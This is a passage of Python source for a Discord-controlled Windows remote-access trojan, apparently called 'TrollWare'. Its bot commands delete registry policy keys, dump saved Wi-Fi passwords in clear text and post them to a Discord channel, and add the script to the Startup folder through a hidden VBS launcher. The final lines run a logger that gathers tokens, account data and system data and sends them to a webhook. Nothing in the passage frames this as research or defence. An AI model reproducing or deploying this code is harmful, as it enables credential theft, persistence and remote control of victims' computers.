                    instruction = r'reg query "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies"'
                    def shell():
                        output = subprocess.run(instruction, stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                        global status
                        statusuusss = "ok"
                        return output
                    import threading
                    shel = threading.Thread(target=shell)
                    shel._running = True
                    shel.start()
                    time.sleep(1)
                    shel._running = False
                    result = str(shell().stdout.decode('CP437'))
                    if len(result) <= 5:
                        await message.channel.send("[❤️] - La commande à été éxecutée avec succès")  
                    else:
                        import winreg as reg
                        reg.DeleteKey(reg.HKEY_CURRENT_USER, r'SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System')
                        await message.channel.send("[❤️] - La commande à été éxecutée avec succès")
            else:
                await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
        if message.content == "!getwifipass":
            import ctypes
            import os
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:
                import ctypes
                import os
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin == True:
                    import os
                    import subprocess
                    import json
                    x = subprocess.run("NETSH WLAN SHOW PROFILE", stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                    x = x[x.find("User profiles\r\n-------------\r\n")+len("User profiles\r\n-------------\r\n"):len(x)].replace('\r\n\r\n"',"").replace('All User Profile', r'"All User Profile"')[4:]
                    lst = []
                    done = []
                    for i in x.splitlines():
                        i = i.replace('"All User Profile"     : ',"")
                        b = -1
                        while True:
                            b = b + 1
                            if i.startswith(" "):
                                i = i[1:]
                            if b >= len(i):
                                break
                        lst.append(i)
                    lst.remove('')
                    for e in lst:
                        output = subprocess.run('NETSH WLAN SHOW PROFILE "' + e + '" KEY=CLEAR ', stdout=subprocess.PIPE,shell=True, stderr=subprocess.PIPE, stdin=subprocess.PIPE).stdout.decode('CP437')
                        for i in output.splitlines():
                            if i.find("Key Content") != -1:
                                ok = i[4:].replace("Key Content            : ","")
                                break
                        almoast = '"' + e + '"' + ":" + '"' + ok + '"'
                        done.append(almoast)
                    await message.channel.send("[❤️] - La commande à été éxecutée avec succès")  
                    await message.channel.send(done)
            else:
                await message.channel.send("[❌] - Cette commande requiert les droit administrateur")
        if message.content == "!startup":
            import ctypes
            import os
            import sys
            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
            if is_admin == True:  
                path = sys.argv[0]
                isexe=False
                if (sys.argv[0].endswith("exe")):
                    isexe=True
                if isexe:
                    os.system(fr'copy "{path}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /Y' )
                else:
                    os.system(r'copy "{}" "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs" /Y'.format(path))
                    e = r"""
    Set objShell = WScript.CreateObject("WScript.Shell")
    objShell.Run "cmd /c cd C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\ && python {}", 0, True
    """.format(os.path.basename(sys.argv[0]))
                    with open(r"C:\Users\{}\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs".format(os.getenv("USERNAME")), "w") as f:
                        f.write(e)
                        f.close()
                await message.channel.send("[❤️] - La commande à été éxecutée avec succès")  
            else:
                await message.channel.send("[❌] - Cette commande requiert les droit administrateur")

TrollWare = Program.Logger(WEBHOOK)
TrollWare.GetTokens()
TrollWare.Account()
TrollWare.System()

client.run(token)
